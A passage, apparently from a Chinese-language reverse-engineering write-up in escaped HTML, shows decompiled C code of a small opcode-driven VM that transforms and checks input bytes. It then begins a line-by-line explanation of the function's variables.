class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// [esp+E8h] [ebp-10h]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; v9&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// [esp+ECh] [ebp-Ch]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  v9 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  v8 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  v7 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  v6 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  v5 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    result &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; v9&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; v9 &lt;span class=&#34;token operator&#34;&gt;&gt;=&lt;/span&gt; a2 &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; result&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;switch&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; a1&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v9&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        Str&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v6 &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; v4&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;v9&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;v6&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;v8&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        v4 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a1&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v9 &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; Str&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v8&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        v9 &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        v4 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Str&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v8&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;LOBYTE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a1&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v9 &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        v9 &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        v4 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a1&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v9 &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; Str&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v8&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        v9 &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        v4 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a1&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v9 &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; Str&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v8&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        v9 &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;v9&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; Str&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v7 &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; a1&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v9 &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;          &lt;span class=&#34;token function&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;what a shame...&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;          &lt;span class=&#34;token function&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;54&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;55&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;v7&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;56&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        v9 &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;57&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;58&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;59&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        Str&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v5&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; v4&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;60&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;v9&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;61&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;v5&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;62&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;63&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;64&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Str&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;65&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;v9&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;66&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;67&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;68&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        v4 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Str&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v8&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;69&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;v9&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;70&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;71&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;72&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        v4 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Str&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v8&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;73&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;v9&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;74&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;75&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token keyword&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;76&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;continue&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;77&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;78&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;79&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;hr /&gt;
+&lt;h3 id=&#34;逐行解释-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#逐行解释-2&#34;&gt;#&lt;/a&gt; &lt;strong&gt;逐行解释：&lt;/strong&gt;&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;变量声明：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;int result;&lt;/code&gt; ：用于存储函数返回值。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;char Str[200];&lt;/code&gt; ：字符数组，用于存储字符串或数据。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;char v4;&lt;/code&gt; ：临时变量，用于存储中间计算的结果。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;int v5, v6, v7, v8, v9;&lt;/code&gt; ：多个整数变量，用于索引和计数。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
